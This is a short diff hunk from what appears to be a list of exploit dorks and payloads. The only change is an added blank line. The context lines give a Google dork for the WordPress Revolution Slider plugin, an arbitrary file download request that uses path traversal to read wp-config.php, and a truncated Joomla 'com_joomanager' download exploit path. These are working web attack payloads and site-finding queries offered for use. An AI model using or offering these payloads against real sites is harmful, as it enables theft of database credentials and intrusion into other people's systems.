@@ -9,4 +9,5 @@ Exploit: index.php?option=com_joomanager&controller=details&task=download&path=c
 WordPress
 
 Dork: WordPress Arbitrary File Download vulnerability inurl:/wp-content/plugins/revslider/
+
 Exploit: admin-ajax.php?action=revslider_show_image&img=../wp-config.php
